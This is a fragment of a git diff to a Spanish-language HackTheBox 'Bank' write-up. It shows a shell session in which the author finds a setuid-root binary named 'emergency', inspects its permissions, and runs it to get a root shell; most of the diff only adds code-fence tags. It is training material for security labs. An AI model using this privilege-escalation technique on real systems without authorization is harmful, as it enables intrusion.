-```
+Tenemos varios como el **passwd, ping** y uno que es extraño:
+```bash
 www-data@bank:/$ file ./var/htb/bin/emergency
 file ./var/htb/bin/emergency
 ./var/htb/bin/emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped
 ```
 Ok, veamos que permisos tiene: 
-```
+```bash
 www-data@bank:/$ ls -la ./var/htb/bin/emergency
 ls -la ./var/htb/bin/emergency
 -rwsr-xr-x 1 root root 112204 Jun 14  2017 ./var/htb/bin/emergency
 ```
 Mmmm ¿Root? Ósea que, si lo ejecutamos, ¿seremos Root? Hagámoslo:
-```
+```bash
 www-data@bank:/$ ./var/htb/bin/emergency
 ./var/htb/bin/emergency
 # whoami
@@ -722,6 +996,7 @@ a...Bueno, ya quedaron todas las flags.
    <a href="#Indice">Volver al Índice</a>
   </button>
 </div>
+
 
 * https://www.google.com/search?client=firefox-b-e&q=ISC+BIND+9.9.5-3ubuntu0.14 https://neoattack.com/neowiki/dns/
 * https://linube.com/ayuda/articulo/267/que-es-un-virtualhost
